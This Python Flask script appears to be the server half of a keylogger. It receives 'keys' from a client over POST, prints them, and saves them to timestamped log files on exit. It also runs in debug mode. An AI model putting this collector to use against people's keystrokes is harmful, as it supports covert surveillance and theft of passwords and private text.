from flask import Flask, request
import atexit
import os
import time

app = Flask(__name__)
keys_received = []

LOG_DIR = 'key_logs/'

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def get_log_filename():
    timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
    return os.path.join(LOG_DIR, f'key_log_{timestamp}.txt')

def save_keys_to_file(keys):
    log_file = get_log_filename()
    with open(log_file, 'a') as f:
        for key in keys:
            f.write(f'{key}\n')
    print(f'Keys saved to {log_file}. Keys received: {keys}')

def save_keys_on_exit():
    save_keys_to_file(keys_received)

atexit.register(save_keys_on_exit)

@app.route('/', methods=['POST'])
def receive_keys():
    keys = request.json.get('keys')
    keys_received.extend(keys)
    print(f'Received keys from client: {keys}')
    return 'Keys received by server'

if __name__ == '__main__':
    app.run(debug=True)
